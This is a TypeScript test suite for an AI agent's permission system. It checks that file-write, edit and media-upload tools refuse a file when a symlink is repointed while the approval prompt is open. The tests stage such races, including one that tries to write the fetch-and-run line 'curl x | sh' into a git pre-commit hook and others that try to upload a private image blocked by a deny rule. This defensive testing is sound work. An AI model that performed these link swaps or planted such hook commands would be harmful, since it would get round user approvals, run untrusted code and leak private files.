/**
 * A file tool acts on the file its call was checked against. The dispatcher
 * observes the call's targets before any approval prompt and binds the call
 * to them; a link pointed elsewhere while the prompt was open makes the tool
 * refuse instead of writing, editing or sending the other file.
 *
 * Every case runs through a real dispatcher (router, direct and phases), the
 * real permission evaluator and a real session approval store.
 */
import { link as hardLink, mkdir, mkdtemp, readFile, rm, symlink, unlink, writeFile } from "node:fs/promises";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, expect, it, vi } from "vitest";

import { createProvider } from "../../src/llm/provider.js";
import { ApprovalStore } from "../../src/permissions/approval-cache.js";
import {
  attachContextDefaults,
  hasPermissionsToUseTool,
  hasPermissionsToUseToolInner,
  type ToolEvaluatorContext,
} from "../../src/permissions/evaluator.js";
import { applyPermissionUpdate } from "../../src/permissions/permission-updates.js";
import { APPROVED, APPROVED_FOR_SESSION, DENIED } from "../../src/permissions/review-decision.js";
import {
  createEmptyToolPermissionContext,
  type ToolPermissionContext,
} from "../../src/permissions/types.js";
import { EventLog } from "../../src/session/event-log.js";
import { resolveAgentRuntimeOptions } from "../../src/session/runtime-options.js";
import type { Session } from "../../src/session/session.js";
import { StreamingToolExecutor } from "../../src/phases/_deps/tool-runtime.js";
import type { ToolRegistry } from "../../src/tool-registry.js";
import { ToolRouter } from "../../src/tools/router.js";
import { createFileEditTool } from "../../src/tools/system/file-edit.js";
import { createFileReadTool } from "../../src/tools/system/file-read.js";
import { createFileWriteTool } from "../../src/tools/system/file-write.js";
import { clearSessionReadState } from "../../src/tools/system/filesystem.js";
import { createImagineEditTool } from "../../src/tools/system/imagine-edit.js";
import { createImagineVideoTool } from "../../src/tools/system/imagine-video.js";
import {
  clearVeniceMediaModels,
  parseVeniceMediaModels,
  recordVeniceMediaModels,
} from "../../src/tools/system/venice-media-models.js";
import type { Tool } from "../../src/tools/types.js";
import { mediaTestHome, VENICE_MEDIA_LIST } from "./system/media-test-helpers.js";

const RUNTIME_OPTIONS = resolveAgentRuntimeOptions({});
const VENICE = "https://api.venice.ai/api/v1";
const PNG = Buffer.from("iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=", "base64");
/** The secret image: a different PNG payload, so an upload of it is visible. */
const SECRET = Buffer.concat([PNG, Buffer.from("secret-trailer")]);
const TRANSPORT: NodeJS.ProcessEnv = Object.freeze({}) as NodeJS.ProcessEnv;

let root = "";
let workspace = "";
let session: Session;
let tools: Tool[];
let permissions: Partial<ToolPermissionContext>;
let prompts = 0;
let serial = 0;
/** Runs while the approval card is open, before the answer. */
let whilePrompting: () => Promise<void> = async () => {};
let answer = APPROVED;
let fetchImpl: ReturnType<typeof vi.fn>;

type Route = "router" | "direct" | "phases";
const ROUTES = ["router", "direct", "phases"] as const;

async function dispatch(
  route: Route,
  name: string,
  args: Record<string, unknown>,
): Promise<{ readonly isError?: boolean; readonly content: unknown }> {
  const id = `bound-target-${++serial}`;
  const turn = {
    subId: `turn-${id}`,
    cwd: workspace,
    approvalPolicy: { value: "on_request" },
    sandboxPolicy: { value: "workspace_write" },
  };
  const options = {
    session,
    turn,
    approvalPolicy: "on_request",
    sandboxMode: "workspace_write",
    approvalResolver: {
      request: async () => {
        prompts += 1;
        await whilePrompting();
        return answer;
      },
    },
    canUseTool: hasPermissionsToUseTool,
    permissionContext: attachContextDefaults({
      session,
      getAppState: () => ({
        toolPermissionContext: createEmptyToolPermissionContext(permissions),
      }),
    } as unknown as ToolEvaluatorContext),
  };
  const tracker = { appendFileDiff() {}, snapshot: () => [], clear() {} };
  if (route !== "phases") {
    const router = new ToolRouter(tools.map((tool) => ({ tool, supportsParallelToolCalls: false })));
    if (route === "direct") {
      return router.dispatchToolCall(
        {
          session,
          turn,
          tracker,
          callId: id,
          toolName: { name },
          payload: { kind: "function", arguments: JSON.stringify(args) },
          source: "direct",
        } as never,
        { ...args },
        options as never,
      );
    }
    return router.dispatchModelToolCall({ id, name, arguments: JSON.stringify(args) }, { ...options, tracker } as never);
  }
  const tool = tools.find((candidate) => candidate.name === name)!;
  const registry: ToolRegistry = {
    tools: [tool],
    toLLMTools: () => [],
    dispatch: async (call) => tool.execute(JSON.parse(call.arguments)),
  };
  const executor = new StreamingToolExecutor({
    registry,
    liveToolDispatch: { router: { registry }, options },
  } as never);
  executor.addTool({}, { id, name, arguments: JSON.stringify(args) });
  executor.close();
  const results = [];
  for await (const result of executor.getRemainingResults()) results.push(result.result);
  expect(results).toHaveLength(1);
  return results[0]! as { readonly isError?: boolean; readonly content: unknown };
}

/** What a sandboxed `ln -sf <target> <link>` does. */
async function repoint(link: string, target: string): Promise<void> {
  await unlink(link);
  await symlink(target, link);
}

/** The tools, built for the session's provider as it is now (their schemas follow it). */
function buildTools(): Tool[] {
  return [
    createFileReadTool({ allowedPaths: [workspace] }),
    createFileEditTool({ allowedPaths: [workspace] }),
    createFileWriteTool({ allowedPaths: [workspace] }),
    createImagineEditTool({ workspaceRoot: workspace, env: TRANSPORT, fetchImpl: fetchImpl as unknown as typeof fetch, getSession: () => session }),
    createImagineVideoTool({
      workspaceRoot: workspace,
      home: mediaTestHome(workspace),
      env: TRANSPORT,
      fetchImpl: fetchImpl as unknown as typeof fetch,
      getSession: () => session,
    }),
  ];
}

/** The session's provider for the next calls: Venice edits, xAI makes videos. */
function useProvider(kind: "venice" | "grok"): void {
  (session.services as { provider: unknown }).provider = kind === "venice"
    ? createProvider("venice", { apiKey: "venice-session", model: "zai-org-glm-5-2" })
    : createProvider("grok", { apiKey: "session-key", model: "grok-4.6", baseURL: "https://api.x.ai/v1" });
  tools = buildTools();
}

/** Requests that carried this image's bytes to a provider. */
function uploadsOf(image: Buffer): number {
  const encoded = image.toString("base64");
  return fetchImpl.mock.calls.filter((call) => String((call[1] as RequestInit | undefined)?.body ?? "").includes(encoded)).length;
}

beforeEach(async () => {
  root = await mkdtemp(join(tmpdir(), "agenc-bound-target-"));
  workspace = join(root, "workspace");
  await mkdir(join(workspace, ".git", "hooks"), { recursive: true });
  await mkdir(join(workspace, "notes"), { recursive: true });
  await mkdir(join(workspace, "pics"), { recursive: true });
  await mkdir(join(workspace, "private"), { recursive: true });
  await writeFile(join(workspace, ".git", "hooks", "pre-commit"), "exit 0\n", { mode: 0o755 });
  await writeFile(join(workspace, "notes", "a.txt"), "exit 0\n");
  await writeFile(join(workspace, "notes", "b.txt"), "exit 0\n");
  await symlink("a.txt", join(workspace, "notes", "current.txt"));
  await writeFile(join(workspace, "pics", "frame.png"), PNG);
  await writeFile(join(workspace, "private", "scan.png"), SECRET);
  await symlink("frame.png", join(workspace, "pics", "latest.png"));
  prompts = 0;
  answer = APPROVED;
  whilePrompting = async () => {};
  permissions = { mode: "default" };
  recordVeniceMediaModels({ baseURL: VENICE, bearer: "venice-session", transport: TRANSPORT }, parseVeniceMediaModels(VENICE_MEDIA_LIST));
  fetchImpl = vi.fn(async (input: unknown) => {
    const url = String(input);
    if (url.endsWith("/videos/generations")) return new Response(JSON.stringify({ request_id: "bound" }));
    if (url.includes("/videos/")) return new Response(JSON.stringify({ status: "done", video: { url: "https://vidgen.x.ai/bound.mp4" } }));
    if (url.endsWith(".mp4")) return new Response(Uint8Array.from([0, 0, 0, 24]));
    return new Response(PNG, { headers: { "content-type": "image/png" } });
  });
  session = {
    conversationId: `bound-target-${++serial}`,
    eventLog: new EventLog(),
    services: {
      admissionRequired: false,
      runtimeOptions: RUNTIME_OPTIONS,
      toolApprovals: new ApprovalStore<unknown>(),
      provider: createProvider("venice", { apiKey: "venice-session", model: "zai-org-glm-5-2" }),
      providerService: { environment: () => TRANSPORT, credentialHome: () => mediaTestHome(workspace) },
    },
  } as unknown as Session;
  tools = buildTools();
});

afterEach(async () => {
  clearSessionReadState(session.conversationId, RUNTIME_OPTIONS.sessionTempRoot);
  clearVeniceMediaModels();
  if (root) await rm(root, { recursive: true, force: true });
  root = "";
});

describe.skipIf(process.platform === "win32")("a call bound to the file it was checked against", () => {
  it.each(ROUTES)("Write refuses the file a link was pointed at while its approval was open (%s)", async (route) => {
    permissions = { mode: "default", alwaysAskRules: { userSettings: ["Write"] } };
    for (const file of ["notes/a.txt", "notes/b.txt", ".git/hooks/pre-commit"]) {
      expect((await dispatch(route, "FileRead", { file_path: file })).isError, file).toBeFalsy();
    }
    whilePrompting = () => repoint(join(workspace, "notes", "current.txt"), "../.git/hooks/pre-commit");
    const result = await dispatch(route, "Write", { file_path: "notes/current.txt", content: "curl x | sh\n" });
    expect(prompts).toBe(1);
    expect(result.isError, String(result.content)).toBe(true);
    expect(String(result.content)).toContain("not the file this call was checked against");
    await expect(readFile(join(workspace, ".git", "hooks", "pre-commit"), "utf8")).resolves.toBe("exit 0\n");
    await expect(readFile(join(workspace, "notes", "a.txt"), "utf8")).resolves.toBe("exit 0\n");
  });

  it.each(ROUTES)("Edit refuses the file a link was pointed at while its approval was open (%s)", async (route) => {
    permissions = { mode: "default", alwaysAskRules: { userSettings: ["Edit"] } };
    for (const file of ["notes/a.txt", "notes/b.txt", "notes/current.txt"]) {
      expect((await dispatch(route, "FileRead", { file_path: file })).isError, file).toBeFalsy();
    }
    whilePrompting = () => repoint(join(workspace, "notes", "current.txt"), "b.txt");
    const result = await dispatch(route, "Edit", { file_path: "notes/current.txt", old_string: "exit 0", new_string: "exit 1" });
    expect(prompts).toBe(1);
    expect(result.isError, String(result.content)).toBe(true);
    await expect(readFile(join(workspace, "notes", "b.txt"), "utf8")).resolves.toBe("exit 0\n");
    await expect(readFile(join(workspace, "notes", "a.txt"), "utf8")).resolves.toBe("exit 0\n");
  });

  it.each(ROUTES)("Write still changes the file it was checked against (%s)", async (route) => {
    permissions = { mode: "default", alwaysAskRules: { userSettings: ["Write"] } };
    expect((await dispatch(route, "FileRead", { file_path: "notes/current.txt" })).isError).toBeFalsy();
    const result = await dispatch(route, "Write", { file_path: "notes/current.txt", content: "exit 2\n" });
    expect(result.isError, String(result.content)).toBeFalsy();
    await expect(readFile(join(workspace, "notes", "a.txt"), "utf8")).resolves.toBe("exit 2\n");
  });

  it.each(ROUTES)("ImagineEdit does not send an image a link was pointed at while its approval was open (%s)", async (route) => {
    permissions = createEmptyToolPermissionContextWithReadDeny();
    whilePrompting = () => repoint(join(workspace, "pics", "latest.png"), "../private/scan.png");
    const result = await dispatch(route, "ImagineEdit", { image: "pics/latest.png", prompt: "brighter" });
    expect(prompts).toBe(1);
    expect(result.isError, String(result.content)).toBe(true);
    expect(String(result.content)).toContain("not the file this call was checked against");
    expect(uploadsOf(SECRET)).toBe(0);
  });

  it.each(ROUTES)("ImagineVideo does not send a first frame a link was pointed at while its approval was open (%s)", async (route) => {
    useProvider("grok");
    permissions = createEmptyToolPermissionContextWithReadDeny();
    whilePrompting = () => repoint(join(workspace, "pics", "latest.png"), "../private/scan.png");
    const result = await dispatch(route, "ImagineVideo", { prompt: "pan", image_url: "pics/latest.png", duration: 3, resolution: "480p" });
    expect(prompts).toBe(1);
    expect(result.isError, String(result.content)).toBe(true);
    expect(uploadsOf(SECRET)).toBe(0);
  });

  it.each(ROUTES)("ImagineVideo does not send a reference image a link was pointed at while its approval was open (%s)", async (route) => {
    useProvider("grok");
    permissions = createEmptyToolPermissionContextWithReadDeny();
    whilePrompting = () => repoint(join(workspace, "pics", "latest.png"), "../private/scan.png");
    const result = await dispatch(route, "ImagineVideo", { prompt: "pan", reference_image_urls: ["pics/frame.png", "pics/latest.png"], duration: 3, resolution: "480p" });
    expect(prompts).toBe(1);
    expect(result.isError, String(result.content)).toBe(true);
    expect(uploadsOf(SECRET)).toBe(0);
  });

  it.each(ROUTES)("ImagineVideo sends the first frame it was checked against (%s)", async (route) => {
    useProvider("grok");
    permissions = createEmptyToolPermissionContextWithReadDeny();
    const result = await dispatch(route, "ImagineVideo", { prompt: "pan", image_url: "pics/latest.png", duration: 3, resolution: "480p" });
    expect(result.isError, String(result.content)).toBeFalsy();
    expect(uploadsOf(PNG)).toBeGreaterThan(0);
  });

  it.each(ROUTES)("ImagineEdit sends the image it was checked against (%s)", async (route) => {
    permissions = createEmptyToolPermissionContextWithReadDeny();
    const result = await dispatch(route, "ImagineEdit", { image: "pics/latest.png", prompt: "brighter" });
    expect(result.isError, String(result.content)).toBeFalsy();
    expect(uploadsOf(PNG)).toBeGreaterThan(0);
  });
});

describe.runIf(process.platform === "linux")("a session grant for one of two names that normalize alike", () => {
  it.each(ROUTES)("asks again for the other file (%s)", async (route) => {
    // Distinct files on a byte-exact filesystem: NFC and NFD spellings.
    const composed = join(workspace, "notes", "café.txt");
    const decomposed = join(workspace, "notes", "café.txt");
    await writeFile(composed, "exit 0\n");
    await writeFile(decomposed, "exit 0\n");
    await repoint(join(workspace, "notes", "current.txt"), "café.txt");
    permissions = { mode: "default", alwaysAskRules: { userSettings: ["Write"] } };
    answer = APPROVED_FOR_SESSION;
    for (const file of [composed, decomposed]) {
      expect((await dispatch(route, "FileRead", { file_path: file })).isError).toBeFalsy();
    }
    expect((await dispatch(route, "Write", { file_path: "notes/current.txt", content: "exit 1\n" })).isError).toBeFalsy();
    expect(prompts).toBe(1);
    await repoint(join(workspace, "notes", "current.txt"), "café.txt");
    answer = DENIED;
    const other = await dispatch(route, "Write", { file_path: "notes/current.txt", content: "exit 2\n" });
    expect(prompts).toBe(2);
    expect(other.isError).toBe(true);
    await expect(readFile(decomposed, "utf8")).resolves.toBe("exit 0\n");
  });
});

describe.skipIf(process.platform === "win32")("an image named literally", () => {
  for (const name of ["ImagineEdit", "ImagineVideo"] as const) {
    it(`${name} checks a bracketed name against the file it reaches`, async () => {
      await symlink("private/scan.png", join(workspace, "[frame].png"));
      await symlink("private/scan.png", join(workspace, "{frame}.png"));
      const tool = tools.find((candidate) => candidate.name === name)!;
      const permission = applyPermissionUpdate(createEmptyToolPermissionContext(), {
        type: "addRules", destination: "session", behavior: "deny",
        rules: [{ toolName: "FileRead", ruleContent: `${workspace}/private/**` }],
      });
      const context = { session: {}, getAppState: () => ({ toolPermissionContext: permission,
        denialTracking: { consecutiveDenials: 0, totalDenials: 0 }, autoModeActive: false }) } as ToolEvaluatorContext;
      for (const ref of ["[frame].png", "{frame}.png"]) {
        const args = name === "ImagineEdit" ? { image: ref, prompt: "x" } : { image_url: ref, prompt: "x" };
        expect(await hasPermissionsToUseToolInner(tool, args, context), ref).toMatchObject({ behavior: "deny" });
      }
    });

    it(`${name} keeps a read deny under a whole-tool ask rule`, async () => {
      const tool = tools.find((candidate) => candidate.name === name)!;
      let permission = applyPermissionUpdate(createEmptyToolPermissionContext(), {
        type: "addRules", destination: "session", behavior: "deny",
        rules: [{ toolName: "FileRead", ruleContent: `${workspace}/private/**` }],
      });
      permission = applyPermissionUpdate(permission, {
        type: "addRules", destination: "session", behavior: "ask", rules: [{ toolName: name }],
      });
      const context = { session: {}, getAppState: () => ({ toolPermissionContext: permission,
        denialTracking: { consecutiveDenials: 0, totalDenials: 0 }, autoModeActive: false }) } as ToolEvaluatorContext;
      const args = name === "ImagineEdit" ? { image: "private/scan.png", prompt: "x" } : { image_url: "private/scan.png", prompt: "x" };
      expect(await hasPermissionsToUseToolInner(tool, args, context)).toMatchObject({ behavior: "deny" });
    });
  }
});

describe.skipIf(process.platform === "win32")("a hard link kept apart from a session grant", () => {
  it("is still bound by name, not by its other names", async () => {
    // Writing one name of a hard-linked ordinary file changes both names; the
    // binding is about which file, and it stays the same file.
    await hardLink(join(workspace, "notes", "a.txt"), join(workspace, "notes", "a-copy.txt"));
    permissions = { mode: "default", alwaysAskRules: { userSettings: ["Write"] } };
    expect((await dispatch("router", "FileRead", { file_path: "notes/a-copy.txt" })).isError).toBeFalsy();
    const result = await dispatch("router", "Write", { file_path: "notes/a-copy.txt", content: "exit 3\n" });
    expect(result.isError, String(result.content)).toBeFalsy();
    await expect(readFile(join(workspace, "notes", "a.txt"), "utf8")).resolves.toBe("exit 3\n");
  });
});

/** Images under private/ are not to be read; everything else asks as usual. */
function createEmptyToolPermissionContextWithReadDeny(): Partial<ToolPermissionContext> {
  return {
    mode: "default",
    alwaysDenyRules: { userSettings: [`FileRead(${workspace}/private/**)`] },
  };
}
